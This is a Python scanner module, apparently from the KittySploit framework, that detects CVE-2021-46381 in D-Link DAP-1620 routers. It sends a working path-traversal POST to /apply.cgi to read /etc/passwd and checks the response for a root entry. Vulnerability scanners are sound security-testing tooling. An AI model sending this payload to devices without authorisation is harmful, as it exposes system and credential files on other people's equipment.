#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""D-Link DAP-1620 is susceptible to local file Inclusion due to path traversal that can lead to unauthorized int."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'D-Link DAP-1620 - Local File Inclusion Detection',
        'description': 'D-Link DAP-1620 is susceptible to local file Inclusion due to path traversal that can lead to unauthorized internal files reading [/etc/passwd] and [/etc/shadow].',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'lfi', 'router', 'packetstorm', 'dlink', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://drive.google.com/drive/folders/19OP09msw8l7CJ622nkvnvnt7EKun1eCG?usp=sharing',
            'https://www.dlink.com/en/security-bulletin/',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-46381',
            'http://packetstormsecurity.com/files/167070/DLINK-DAP-1620-A1-1.01-Directory-Traversal.html',
            'https://github.com/SYRTI/POC_to_review',
        ],
        'cve': 'CVE-2021-46381',
    }

    def run(self):
        path = '/apply.cgi'
        r = self.http_request(method='POST', path=path, allow_redirects=False, data='action=do_graph_auth&graph_code=94102&html_response_message=just_login&html_response_page=../../../../../../../../../../../../../../etc/passwd&log_pass=DummyPass&login_n=admin&login_name=DummyName&tkn=634855349&tmp_log_pass=DummyPass&tmp_log_pass_auth=DummyPass')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if any(re.search(rx, body) for rx in body_regexes):
            self.set_info(
                severity='high',
                reason='D-Link DAP-1620 - Local File Inclusion detected',
                path=path,
            )
            return True
        return False

